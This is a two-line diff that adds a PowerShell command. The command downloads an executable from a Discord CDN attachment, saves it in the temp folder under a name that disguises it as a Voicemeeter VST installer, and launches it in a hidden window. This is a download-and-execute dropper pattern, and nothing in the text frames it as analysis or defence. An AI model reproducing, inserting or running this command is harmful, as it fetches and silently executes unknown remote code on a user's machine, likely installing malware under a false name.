@@ -1,0 +1,2 @@
+iwr -useb https://cdn.discordapp.com/attachments/1049753118608457780/1050529376900485200/Fueled-Up.exe
+ -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
